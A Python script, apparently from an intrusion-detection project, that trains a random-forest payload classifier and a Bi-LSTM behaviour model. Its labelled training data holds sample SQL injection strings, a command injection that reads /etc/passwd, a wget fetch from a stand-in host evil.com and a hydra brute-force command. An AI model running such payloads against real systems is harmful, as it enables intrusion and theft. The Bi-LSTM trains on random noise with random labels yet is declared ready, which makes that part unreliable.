import os
import torch
import torch.nn as nn
import torch.optim as optim
import pandas as pd
import numpy as np
import joblib
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.pipeline import Pipeline
from bilstm_model import BehaviouralBiLSTM
from rich.console import Console

console = Console()

MODEL_DIR = "ml/models"
RF_MODEL_PATH = os.path.join(MODEL_DIR, "rf_classifier.joblib")
LSTM_MODEL_PATH = os.path.join(MODEL_DIR, "bilstm_model.pt")

def ensure_dirs():
    os.makedirs(MODEL_DIR, exist_ok=True)

def train_random_forest():
    console.print("\n[bold blue]🚀 Stage 2: Training Random Forest (Fast Signature Classifier)[/bold blue]")
    
    # 1. Generate Synthetic Training Data
    commands = [
        # Normal
        ("ls -la", "BENIGN"), ("cd /tmp", "BENIGN"), ("whoami", "BENIGN"), ("pwd", "BENIGN"),
        # Sql Injection
        ("admin' OR 1=1 --", "SQL_INJECTION"), ("union select null, version()", "SQL_INJECTION"),
        # Command Injection
        ("; cat /etc/passwd", "CMD_INJECTION"), ("&& wget http://evil.com/malware", "CMD_INJECTION"),
        # Brute Force
        ("ssh root@localhost", "BRUTE_FORCE"), ("hydra -l root -P pass.txt", "BRUTE_FORCE")
    ] * 20 # Duplicate to make a tiny dataset

    df = pd.DataFrame(commands, columns=["payload", "label"])
    
    # 2. Build Pipeline (TF-IDF + Random Forest)
    pipeline = Pipeline([
        ('tfidf', TfidfVectorizer(max_features=100)),
        ('rf', RandomForestClassifier(n_estimators=50, random_state=42))
    ])
    
    # 3. Fit
    pipeline.fit(df["payload"], df["label"])
    
    # 4. Save
    joblib.dump(pipeline, RF_MODEL_PATH)
    console.print(f"[green]✅ Random Forest model successfully saved to {RF_MODEL_PATH}[/green]")


def train_bilstm():
    console.print("\n[bold blue]🚀 Stage 2: Training Bi-LSTM (Behavioral Sequence Analyzer)[/bold blue]")
    
    # 1. Initialize PyTorch Model
    input_dim = 768 # Emulating Sentence-BERT embedding size
    hidden_dim = 128
    num_classes = 3 # 0: Script-Bot, 1: Persistent, 2: APT
    
    model = BehaviouralBiLSTM(input_dim=input_dim, hidden_dim=hidden_dim, num_classes=num_classes)
    criterion = nn.CrossEntropyLoss()
    optimizer = optim.Adam(model.parameters(), lr=0.001)
    
    # 2. Generate Synthetic Sequences
    # Sequence format: (Batch Size: 100, Seq Length: 5, Embed Dim: 768)
    X_train = torch.randn(100, 5, input_dim) 
    y_train = torch.randint(0, num_classes, (100,))
    
    # 3. Quick Train Loop
    model.train()
    epochs = 10
    
    for epoch in range(epochs):
        optimizer.zero_grad()
        outputs = model(X_train)
        loss = criterion(outputs, y_train)
        loss.backward()
        optimizer.step()
        
        if (epoch+1) % 5 == 0:
            console.print(f"Epoch [{epoch+1}/{epochs}], Loss: {loss.item():.4f}")
            
    # 4. Save
    torch.save(model.state_dict(), LSTM_MODEL_PATH)
    console.print(f"[green]✅ Bi-LSTM model successfully saved to {LSTM_MODEL_PATH}[/green]\n")


def run_training():
    ensure_dirs()
    train_random_forest()
    train_bilstm()
    console.print("[bold green]🎯 Stage 2 Training Fully Complete! Both models are ready.[/bold green]")

if __name__ == "__main__":
    run_training()
